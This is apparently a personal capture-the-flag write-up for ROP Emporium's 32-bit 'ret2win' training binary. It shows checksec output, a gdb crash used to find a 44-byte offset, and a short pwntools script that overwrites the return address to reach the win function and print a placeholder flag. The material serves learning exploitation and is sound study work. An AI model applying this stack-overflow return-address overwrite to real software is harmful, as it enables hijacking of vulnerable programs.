# challenge 1

easy mode

```shell
➜  x86_ret2win checksec ./ret2win32 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/x86_ret2win/ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
➜  x86_ret2win ./ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> ^C
```

```shell
➜  x86_ret2win objdump -D ./ret2win32 | grep "ret2win"
./ret2win32:     file format elf32-i386
0804862c <ret2win>:
```

```shell
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fb6870 --> 0x0 
ESI: 0xf7fb5000 --> 0x1b2db0 
EDI: 0xf7fb5000 --> 0x1b2db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd070 ("bAA1AAGA")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd070 ("bAA1AAGA")
0004| 0xffffd074 ("AAGA")
0008| 0xffffd078 --> 0x0 
0012| 0xffffd07c --> 0xf7e1a647 (<__libc_start_main+247>:       add    esp,0x10)
0016| 0xffffd080 --> 0xf7fb5000 --> 0x1b2db0 
0020| 0xffffd084 --> 0xf7fb5000 --> 0x1b2db0 
0024| 0xffffd088 --> 0x0 
0028| 0xffffd08c --> 0xf7e1a647 (<__libc_start_main+247>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ AcAA2AAHAAdAA3AAIAAeAA4A
Undefined command: "AcAA2AAHAAdAA3AAIAAeAA4A".  Try "help".
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44          # get the offset of PWNME function ret address 
```

# exp

```python
from pwn import *

pipe = process("./ret2win32")

ret2win = 0x0804862C

payload = "A" * 44
payload += p32(ret2win)

print(pipe.recvuntil("> "))
pipe.sendline(payload)
print(pipe.recvall())
```

```shell
➜  x86_ret2win python ./exp.py 
[+] Starting local process './ret2win32': pid 53314
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> 
[+] Receiving all data: Done (73B)
[*] Process './ret2win32' stopped with exit code -11 (SIGSEGV) (pid 53314)
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```
